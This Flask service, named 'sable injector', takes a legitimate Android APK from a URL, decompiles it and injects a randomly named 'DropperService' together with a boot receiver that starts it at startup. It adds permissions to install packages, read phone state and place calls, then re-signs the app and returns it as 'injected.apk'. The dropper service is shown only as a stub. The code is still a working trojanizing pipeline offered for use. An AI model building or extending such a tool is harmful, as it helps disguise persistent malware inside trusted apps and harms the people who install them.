import os
import subprocess
import shutil
import tempfile
import requests
import zipfile
import traceback
import random
import string
from flask import Flask, request, send_file, jsonify

app = Flask(__name__)
WORK = tempfile.mkdtemp()
KEYSTORE = "keystore.jks"

@app.errorhandler(500)
def internal_error(exception):
    return jsonify({"error": f"Internal Server Error: {str(exception)}"}), 500

@app.route("/")
def home():
    return "sable injector alive"

@app.route("/inject", methods=["POST"])
def inject():
    try:
        data = request.json or {}
        file_url = data.get("apk_url")
        if not file_url:
            return jsonify({"error": "apk_url required"}), 400

        target = os.path.join(WORK, "target.apk")
        
        # 1. Target APK Download
        response = requests.get(file_url, stream=True, timeout=60)
        if response.status_code != 200:
            return jsonify({"error": f"Download failed: HTTP {response.status_code}"}), 400
        
        with open(target, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        if not zipfile.is_zipfile(target):
            return jsonify({"error": "Downloaded file is not a valid APK"}), 400

        # 2. Target APK Decompile (-r flag se icon/resources safe rahenge)
        target_dir = os.path.join(WORK, "target_dir")
        shutil.rmtree(target_dir, ignore_errors=True)
        subprocess.run(f"apktool d -r -f -o {target_dir} {target}", shell=True, capture_output=True, text=True)

        manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
        if not os.path.exists(manifest_path) or os.path.isdir(manifest_path):
            return jsonify({"error": "Target APK kharab hai ya Manifest folder ban gaya hai."}), 500

        # 3. Ek random package name banayenge dropper ke liye
        random_pkg = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        pkg_path = f"com/{random_pkg}/dropper"
        smali_dir = os.path.join(target_dir, "smali", *pkg_path.split("/"))
        os.makedirs(smali_dir, exist_ok=True)

        # 4. Dropper Service Smali Code
        with open(os.path.join(smali_dir, "DropperService.smali"), "w") as f:
            f.write(f'''.class public Lcom/{random_pkg}/dropper/DropperService;
.super Landroid/app/Service;
.source "DropperService.java"

.method public constructor <init>()V
    .locals 0
    invoke-direct {{p0}}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method
''')

        # 5. Boot Receiver Smali Code (Phone on hote hi chalu hoga)
        with open(os.path.join(smali_dir, "BootReceiver.smali"), "w") as f:
            f.write(f'''.class public Lcom/{random_pkg}/dropper/BootReceiver;
.super Landroid/content/BroadcastReceiver;
.source "BootReceiver.java"

.method public constructor <init>()V
    .locals 0
    invoke-direct {{p0}}, Landroid/content/BroadcastReceiver;-><init>()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/{random_pkg}/dropper/DropperService;
    invoke-direct {{v0, p1, v1}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    return-void
.end method
''')

        # 6. Manifest Merge (Sirf permissions aur services add karega, Original Icon safe rahega)
        with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
            t = f.read()

        perms = [
            "android.permission.INTERNET",
            "android.permission.REQUEST_INSTALL_PACKAGES",
            "android.permission.RECEIVE_BOOT_COMPLETED",
            "android.permission.WAKE_LOCK",
            "android.permission.READ_PHONE_STATE", 
            "android.permission.CALL_PHONE"
        ]
        insert_perms = "".join(f'<uses-permission android:name="{p}"/>' for p in perms if p not in t)
        if insert_perms:
            t = t.replace("</application>", insert_perms + "</application>")

        comp_str = f'''
        <service android:name="com.{random_pkg}.dropper.DropperService" android:exported="false" />
        <receiver android:name="com.{random_pkg}.dropper.BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
        '''
        
        t = t.replace("</application>", comp_str + "</application>")
        
        with open(manifest_path, "w", encoding='utf-8') as f:
            f.write(t)

        # 7. Build APK
        unsigned = os.path.join(WORK, "unsigned.apk")
        res = subprocess.run(f"apktool b -f -o {unsigned} {target_dir}", shell=True, capture_output=True, text=True)
        if res.returncode != 0:
            return jsonify({"error": f"Build fail: {res.stderr[:200]}"}), 500

        # 8. Align and Sign (V1 + V2 Signatures)
        aligned = os.path.join(WORK, "aligned.apk")
        signed = os.path.join(WORK, "signed.apk")
        subprocess.run(f"zipalign -f -p 4 {unsigned} {aligned}", shell=True, check=True)
        
        res = subprocess.run(f"apksigner sign --min-sdk-version 21 --v1-signing-enabled true --v2-signing-enabled true --ks {KEYSTORE} --ks-pass pass:sable123 --key-pass pass:sable123 --out {signed} {aligned}", shell=True, capture_output=True, text=True)
        if res.returncode != 0:
            return jsonify({"error": f"Signing failed: {res.stderr[:200]}"}), 500

        return send_file(signed, as_attachment=True, download_name="injected.apk")

    except Exception as e:
        traceback.print_exc()
        return jsonify({"error": f"Python Error: {str(e)}"}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
